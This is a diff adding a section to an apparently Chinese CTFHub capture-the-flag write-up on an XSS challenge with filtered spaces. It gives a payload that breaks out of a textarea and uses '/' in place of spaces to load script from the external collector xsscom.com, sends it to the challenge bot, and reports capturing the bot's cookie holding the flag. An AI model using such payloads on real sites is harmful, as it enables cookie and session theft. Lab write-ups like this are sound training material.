@@ -1308,3 +1308,15 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 
 ------
 
+#### 过滤空格
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。我们可以用`/`来代替空格，
+
+> #### What's your name 后的输入框填写 `</textarea>'"><script/src=http://xsscom.com//purFOq></script>` 点击Submit
+>
+> #### Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script/src=http://xsscom.com//purFOq></script>` 点击Send
+
+在接收到的内容中能看到`cookie : flag=ctfhub{1751e5e28f77d81afa0c962a}`，提交即可。
+
+------
+
